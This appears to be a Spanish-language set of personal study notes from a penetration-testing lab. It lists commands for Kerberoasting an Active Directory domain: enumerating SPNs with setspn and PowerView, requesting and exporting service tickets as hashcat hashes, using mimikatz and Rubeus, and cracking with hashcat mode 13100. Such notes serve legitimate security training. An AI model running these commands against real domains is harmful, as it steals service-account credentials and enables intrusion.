Podemos listar los users con SNP con setspn.exe

    setspn.exe -Q */*

Esto nos va a traer muchos spn, debemos enfocarnos en los users nomás.

Traer todos los tickets:


    setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }


POWERSHELL traer tickets de un user puntual:

    Add-Type -AssemblyName System.IdentityModel

    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<long_name_account>"             

ejemplo de long_name_account: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

Extraerlos con powerview:

    Import-Module .\PowerView.ps1


traer todos los users spn:

    Get-DomainUser * -spn | select samaccountname

si queremos trar los spn de un domain en específico (para aprovechar confianzas entre forests)

    Import-Module .\powerview.ps1; Get-DomainUser -SPN -Domain <domain> | Select-Object SamAccountName

traer el ticket de un usuario en especial:

    Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat    (esto no tre el ticket para copiar y pegar)

traer todos los tickets a un csv

    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

guardar el ticket de un usuario en especial:

    Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

mimikatz:

    mimikatz # kerberos::list /export  

Rubeus:

    .\Rubeus.exe kerberoast /outfile:hashes.kerberoast


hashcat -m 13100
